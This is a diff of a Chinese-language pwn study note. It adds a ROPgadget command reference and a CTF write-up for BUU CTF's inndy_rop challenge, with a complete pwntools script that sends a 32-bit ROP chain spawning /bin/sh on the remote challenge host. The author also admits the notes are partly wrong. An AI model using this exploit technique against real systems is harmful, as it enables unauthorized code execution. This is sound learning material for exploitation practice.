@@ -15,6 +15,8 @@ tags:
     - 学习日志
 ---
 
+## 前言
+
 使用环境 ：wsl kali linux
 
 ```
@@ -30,6 +32,15 @@ SUPPORT_URL="https://forums.kali.org/"
 BUG_REPORT_URL="https://bugs.kali.org/"
 ANSI_COLOR="1;31
 ```
+
+很多东西都是现学现写，所以你将看到：
+
+* 多变的代码风格
+* 无力的叙述语言
+* 半对半错的理解
+* 效率低下的调试
+
+所以是 0x00 版学习笔记，待我 pwn 功力打成，自会出 0xff 版的（逃）
 
 ## Reference
 
@@ -1436,8 +1447,108 @@ ROP（Return Oriented Programming）的本质是：
 * Gadgets: 比如 `pop rdi; ret`。这条指令的作用是将栈顶数据弹出到 `rdi` 寄存器，然后返回。
 * Chain: 通过精心构造栈布局，让 `ret` 指令不断连接不同的 Gadgets，像链条一样执行一连串操作。
 
+### ROPgadget 工具
 
-### 例题 1：[HarekazeCTF2019]baby_rop
+我们常用以下 ROPgadget 指令得到有效的 gadgets：
+
+`ROPgadget --binary rop --only "pop|ret" | grep rdi` 获取单个寄存器（这里是 rdi）的 gadgets
+
+`ROPgadget --binary rop --only "pop|ret" --filter "00"` 排除所有地址中包含 00 的 gadgets（如果是 gets() 或者 scanf("%s")，地址带 00 会导致截断）
+
+`ROPgadget --binary rop --string "syscall"` 查找系统调用（用于 SROP）
+
+`ROPgadget --binary rop --only "leave|ret"` 查找栈迁移的 gadgets
+
+`ROPgadget --binary rop | grep "mov.*ptr.*ret"` 寻找类似 `mov [rdi], rsi` 这种格式。
+
+`ROPgadget --binary rop | grep "jmp rsp"` 寻找是否有跳转到 rsp 的指令。
+
+| 参数 | 作用 | 备注 |
+| --- | --- | --- |
+| `--binary <file>` | 指定目标文件 | 必选 |
+| `--only "<ins>"` | 只显示包含特定指令的行 | 常用 `"pop|ret"` |
+| `--grep "<string>"` | 在结果中搜索字符串 | 也可以直接配合系统 `grep` |
+| `--filter "<hex>"` | 过滤掉包含特定字节的地址 | 用于避开坏字符（如 `00`） |
+| `--offset <addr>` | 设置基址偏移 | 常用在绕过 ASLR 后计算真实地址 |
+| `--range <start>-<end>` | 在指定内存范围搜索 | 缩小搜索范围 |
+| `--string "/bin/sh"` | 查找硬编码字符串 | 看看程序里有没有现成的 "/bin/sh" |
+
+ROPgadget 还有全自动生成一条完整 ROP 链的指令，即 `ROPgadget --binary rop --ropchain`，其内部逻辑是遍历 rop 这个二进制文件，尝试寻找以下组件并拼凑起来：
+
+* 向内存（如 .data 或 .bss 段）写入 `/bin/sh` 字符串的 gadgets。
+* 控制目标寄存器的 gadgets（例如 x86 下的 `eax=11, ebx, ecx, edx`，或者 x64 下的 `rax=59, rdi, rsi, rdx`）。
+* 触发系统调用的 gadget (`int 0x80` 或 `syscall`)。
+
+这使得它具有以下限制性：
+
+* 往往只适用于静态编译：程序绝大多数都是动态链接的，在动态链接的程序中，二进制文件本体非常小，包含的指令极其有限，凑不出来这么多 gadgets。
+* 无法应对 ASLR，有限栈空间，坏字符等问题。
+
+所以它的应用空间很狭小，但是我们的例题 1 就可以这么用。
+
+#### 例题 1：inndy_rop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#inndy_rop)
+
+发现这个二进制文件大的离谱，赶紧检查一下。
+
+<img width="1633" height="174" alt="2a200b74e27ff693c5f925bf8f2e2e95" src="https://github.com/user-attachments/assets/e994f3bc-f4b5-4db7-8f6d-aad8b7e9edce" />
+
+果然是静态编译，那么我们就可以用 `ROPgadget --binary rop --ropchain` 直接得到一套 ROP 链。
+
+```
+# written by Sonnety
+from pwn import *
+from struct import pack
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28089
+io=remote(host,port)
+
+def main():
+    p = b'A'*0x10
+    p += pack('<I', 0x0806ecda) # pop edx ; ret
+    p += pack('<I', 0x080ea060) # @ .data
+    p += pack('<I', 0x080b8016) # pop eax ; ret
+    p += b'/bin'
+    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('<I', 0x0806ecda) # pop edx ; ret
+    p += pack('<I', 0x080ea064) # @ .data + 4
+    p += pack('<I', 0x080b8016) # pop eax ; ret
+    p += b'//sh'
+    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('<I', 0x0806ecda) # pop edx ; ret
+    p += pack('<I', 0x080ea068) # @ .data + 8
+    p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('<I', 0x080481c9) # pop ebx ; ret
+    p += pack('<I', 0x080ea060) # @ .data
+    p += pack('<I', 0x080de769) # pop ecx ; ret
+    p += pack('<I', 0x080ea068) # @ .data + 8
+    p += pack('<I', 0x0806ecda) # pop edx ; ret
+    p += pack('<I', 0x080ea068) # @ .data + 8
+    p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0807a66f) # inc eax ; ret
+    p += pack('<I', 0x0806c943) # int 0x80
+    io.send(p)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 2：[HarekazeCTF2019]baby_rop
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)
 
